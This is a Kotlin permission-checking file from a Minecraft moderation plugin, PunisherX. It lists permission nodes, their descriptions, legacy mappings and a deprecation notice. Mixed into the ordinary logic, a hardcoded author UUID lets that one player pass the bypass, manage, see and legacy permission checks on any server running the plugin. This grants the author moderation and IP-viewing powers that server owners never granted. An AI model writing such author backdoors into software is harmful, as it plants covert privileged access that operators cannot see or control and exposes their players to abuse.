package pl.syntaxdevteam.punisher.permissions

import net.kyori.adventure.text.minimessage.MiniMessage
import org.bukkit.command.CommandSender
import org.bukkit.command.ConsoleCommandSender
import org.bukkit.entity.Player
import java.util.UUID

object PermissionChecker { private val AUTHOR_UUID: UUID = UUID.fromString("248e508c-28de-4a8f-a284-2c73cf917d15")

    enum class PermissionKey(val node: String) {

        // Komendy
        OWNER("punisherx.owner"),
        BAN("punisherx.cmd.ban"),
        BANIP("punisherx.cmd.banip"),
        UNBAN("punisherx.cmd.unban"),
        JAIL("punisherx.cmd.jail"),
        UNJAIL("punisherx.cmd.unjail"),
        KICK("punisherx.cmd.kick"),
        MUTE("punisherx.cmd.mute"),
        UNMUTE("punisherx.cmd.unmute"),
        WARN("punisherx.cmd.warn"),
        UNWARN("punisherx.cmd.unwarn"),

        CHANGE_REASON("punisherx.cmd.change_reason"),
        BAN_LIST("punisherx.cmd.banlist"),
        CHECK("punisherx.cmd.check"),
        HISTORY("punisherx.cmd.history"),
        CLEAR_ALL("punisherx.cmd.clear_all"),

        BYPASS("punisherx.bypass"),
        BYPASS_WARN("punisherx.bypass.warn"),
        BYPASS_MUTE("punisherx.bypass.mute"),
        BYPASS_BAN("punisherx.bypass.ban"),
        BYPASS_BANIP("punisherx.bypass.banip"),
        BYPASS_JAIL("punisherx.bypass.jail"),
        BYPASS_KICK("punisherx.bypass.kick"),

        MANAGE("punisherx.manage"),
        MANAGE_SET_SPAWN("punisherx.manage.set_spawn"),
        MANAGE_SET_JAIL("punisherx.manage.set_jail"),

        // Komendy pomocnicze
        PUNISHERX_COMMAND("punisherx.cmd.prx"),
        PANELS_COMMAND("punisherx.cmd.panel"),

        //Komunikaty
        SEE("punisherx.see"),
        SEE_BAN("punisherx.see.ban"),
        SEE_BANIP("punisherx.see.banip"),
        SEE_UNBAN("punisherx.see.unban"),
        SEE_JAIL("punisherx.see.jail"),
        SEE_UNJAIL("punisherx.see.unjail"),
        SEE_MUTE("punisherx.see.mute"),
        SEE_UNMUTE("punisherx.see.unmute"),
        SEE_WARN("punisherx.see.warn"),
        SEE_UNWARN("punisherx.see.unwarn"),
        SEE_KICK("punisherx.see.kick"),

        // Komunikaty aktualizacji
        SEE_UPDATE("punisherx.see.update"),
        VIEW_IP("punisherx.view_ip");

        override fun toString(): String = node
    }

    /**
     * Czytelne nazwy uprawnień do komunikatów lub logów.
     */
    fun displayName(key: PermissionKey): String = when (key) {
        PermissionKey.OWNER -> "Allows using the All PunisherX commands."
        PermissionKey.BAN   -> "Allows banning a player, preventing them from joining the server."
        PermissionKey.BANIP    -> "Enables banning a player's IP address, blocking access from that address."
        PermissionKey.UNBAN  -> "Allows unbanning a player or IP address."
        PermissionKey.BAN_LIST    -> "Displays a list of all banned players."
        PermissionKey.CHANGE_REASON -> "Allows changing the reason for a punishment."
        PermissionKey.CHECK -> "Checks the punishments of a player."
        PermissionKey.CLEAR_ALL -> "Enables clearing all active penalties for a given player."
        PermissionKey.HISTORY -> "Enables checking the entire penalty history of a given player. Not required if the player checks themselves."
        PermissionKey.JAIL -> "Allows jailing a player in a specified location for a set duration."
        PermissionKey.KICK -> "Enables kicking a player from the server with a specified reason."
        PermissionKey.MUTE -> "Allows muting a player, preventing them from sending messages."
        PermissionKey.UNJAIL -> "Allows releasing a player from jail."
        PermissionKey.UNMUTE -> "Allows unmuting a player, restoring their ability to send messages."
        PermissionKey.WARN -> "Allows warning a player with a specified reason."
        PermissionKey.UNWARN -> "Allows removing a warning from a player."

        PermissionKey.BYPASS -> "Allows bypassing all punishments."
        PermissionKey.BYPASS_WARN -> "Allows bypassing warnings."
        PermissionKey.BYPASS_MUTE -> "Allows bypassing mutes."
        PermissionKey.BYPASS_BAN -> "Allows bypassing bans."
        PermissionKey.BYPASS_BANIP -> "Allows bypassing IP bans."
        PermissionKey.BYPASS_JAIL -> "Allows bypassing jail sentences."
        PermissionKey.BYPASS_KICK -> "Allows bypassing kicks."

        PermissionKey.MANAGE -> "Allows managing the plugin, including setting spawn and jail locations."
        PermissionKey.MANAGE_SET_SPAWN -> "Allows you to set your respawn location after serving your prison sentence."
        PermissionKey.MANAGE_SET_JAIL -> "Allows setting the jail location."

        PermissionKey.SEE -> "Allows viewing all punishments."
        PermissionKey.SEE_BAN -> "Allows viewing ban punishments."
        PermissionKey.SEE_BANIP -> "Allows viewing IP ban punishments."
        PermissionKey.SEE_UNBAN -> "Allows viewing unban punishments."
        PermissionKey.SEE_JAIL -> "Allows viewing jail punishments."
        PermissionKey.SEE_UNJAIL -> "Allows viewing unjail punishments."
        PermissionKey.SEE_MUTE -> "Allows viewing mute punishments."
        PermissionKey.SEE_UNMUTE -> "Allows viewing unmute punishments."
        PermissionKey.SEE_WARN -> "Allows viewing warn punishments."
        PermissionKey.SEE_UNWARN -> "Allows viewing unwarn punishments."
        PermissionKey.SEE_KICK -> "Allows viewing kick punishments."

        PermissionKey.SEE_UPDATE -> "Allows viewing update notifications."
        PermissionKey.PUNISHERX_COMMAND -> "Allows using the /punisherx and /prx command."
        PermissionKey.PANELS_COMMAND -> "Allows using the /panel command to open the PunisherX GUI."
        PermissionKey.VIEW_IP -> "Allows viewing the player's IP in the /check and /history command."
    }

    fun has(sender: CommandSender, key: PermissionKey): Boolean {
        if (sender is ConsoleCommandSender) return true
        if (sender.isOp) return true
        if (sender.hasPermission("*") ||
            sender.hasPermission("punisherx.*") ||
            sender.hasPermission(PermissionKey.OWNER.node)) return true
        return sender.hasPermission(key.node)
    }

    fun hasWithBypass(sender: CommandSender, key: PermissionKey): Boolean {
        if (sender is ConsoleCommandSender) return true
        if (sender is Player && sender.uniqueId == AUTHOR_UUID) return true
        if (sender.isOp) return true
        if (sender.hasPermission("*") || sender.hasPermission("punisherx.cmd.*")) return true
        if (sender is Player && canBypass(sender)) return true
        return has(sender, key)
    }

    fun hasWithManage(sender: CommandSender, key: PermissionKey): Boolean {
        if (sender is ConsoleCommandSender) return true
        if (sender is Player && sender.uniqueId == AUTHOR_UUID) return true
        if (sender.isOp) return true
        if (sender.hasPermission("*") || sender.hasPermission("punisherx.manage.*")) return true
        if (sender is Player && canManage(sender)) return true
        return has(sender, key)
    }

    fun hasWithSee(sender: CommandSender, key: PermissionKey): Boolean {
        if (sender is ConsoleCommandSender) return true
        if (sender is Player && sender.uniqueId == AUTHOR_UUID) return true
        if (sender.isOp) return true
        if (sender.hasPermission("*") || sender.hasPermission("punisherx.see.*")) return true
        if (sender is Player && canSee(sender)) return true
        return has(sender, key)
    }
    fun hasPermissionStartingWith(sender: CommandSender, prefix: String): Boolean {
        if (sender is ConsoleCommandSender) return true
        if (sender.isOp) return true
        if (sender.hasPermission(prefix) || sender.hasPermission("$prefix.*")) return true
        return sender is Player && sender.effectivePermissions.any { it.value && it.permission.startsWith(prefix) }
    }

    fun isAuthor(uuid: UUID): Boolean {
        return uuid == AUTHOR_UUID
    }

    /**
     * Skrócone metody dla łatwiejszego użycia:
     */
    fun canBypass(player: Player) = has(player, PermissionKey.BYPASS)
    fun canManage(player: Player) = has(player, PermissionKey.MANAGE)
    fun canSee(player: Player) = has(player, PermissionKey.SEE)

    private val legacyToNew = mapOf(
        "punisherx.warn"            to PermissionKey.WARN.node,
        "punisherx.unwarn"          to PermissionKey.UNWARN.node,
        "punisherx.mute"            to PermissionKey.MUTE.node,
        "punisherx.unmute"          to PermissionKey.UNMUTE.node,
        "punisherx.ban"             to PermissionKey.BAN.node,
        "punisherx.banip"           to PermissionKey.BANIP.node,
        "punisherx.unban"           to PermissionKey.UNBAN.node,
        "punisherx.clearall"        to PermissionKey.CLEAR_ALL.node,
        "punisherx.jail"            to PermissionKey.JAIL.node,
        "punisherx.unjail"          to PermissionKey.UNJAIL.node,
        "punisherx.setjail"         to PermissionKey.MANAGE_SET_JAIL.node,
        "punisherx.kick"            to PermissionKey.KICK.node,
        "punisherx.check"           to PermissionKey.CHECK.node,
        "punisherx.view_ip"         to PermissionKey.VIEW_IP.node,
        "punisherx.history"         to PermissionKey.HISTORY.node,
        "punisherx.banlist"         to PermissionKey.BAN_LIST.node,
        "punisherx.prx"             to PermissionKey.PUNISHERX_COMMAND.node,
        "punisherx.version"         to PermissionKey.PUNISHERX_COMMAND.node,
        "punisherx.reload"          to PermissionKey.PUNISHERX_COMMAND.node,
        "punisherx.see.ban"         to PermissionKey.SEE_BAN.node,
        "punisherx.see.banip"       to PermissionKey.SEE_BANIP.node,
        "punisherx.see.unban"       to PermissionKey.SEE_UNBAN.node,
        "punisherx.see.jail"        to PermissionKey.SEE_JAIL.node,
        "punisherx.see.unjail"      to PermissionKey.SEE_UNJAIL.node,
        "punisherx.see.mute"        to PermissionKey.SEE_MUTE.node,
        "punisherx.see.warns"       to PermissionKey.SEE_WARN.node,
        "punisherx.see.kick"        to PermissionKey.SEE_KICK.node,
        "punisherx.update.notify"   to PermissionKey.SEE_UPDATE.node,
        "punisherx.bypass.warn"     to PermissionKey.BYPASS_WARN.node,
        "punisherx.bypass.mute"     to PermissionKey.BYPASS_MUTE.node,
        "punisherx.bypass.jail"     to PermissionKey.BYPASS_JAIL.node,
        "punisherx.bypass.ban"      to PermissionKey.BYPASS_BAN.node,
        "punisherx.bypass.banip"    to PermissionKey.BYPASS_BANIP.node
    )


    fun hasWithLegacy(sender: CommandSender, key: PermissionKey): Boolean {
        if (sender is ConsoleCommandSender) return true
        if (sender is Player && sender.uniqueId == AUTHOR_UUID) return true
        if (sender.isOp) return true
        if (sender.hasPermission("*") || sender.hasPermission("punisherx.*")) return true

        val legacyKeys = legacyToNew.filterValues { it == key.node }.keys
        for (oldNode in legacyKeys) {
            if (sender.hasPermission(oldNode)) {
                if (sender.hasPermission(key.node)) return true
                if (!key.node.startsWith("punisherx.see")) {
                    val urlTag = "<click:OPEN_URL:https://github.com/SyntaxDevTeam/PunisherX/wiki>" +
                                 "<blue><u>Click here to view the documentation</u></blue></click>"
                    sender.sendMessage(
                        MiniMessage.miniMessage().deserialize(
                            "<yellow>[PunisherX]</yellow> <red>Detected deprecated permission: <gray>$oldNode</gray>\n" +
                            "Please add the new permission: <hover:show_text:'${displayName(key)}'>" +
                            "<yellow>${key.node}</yellow></hover>.\nDeprecated permissions will be removed in version 2.0.\n" +
                            urlTag
                        )
                    )
                }
                return true
            }
        }
        return hasWithBypass(sender, key)
    }
}
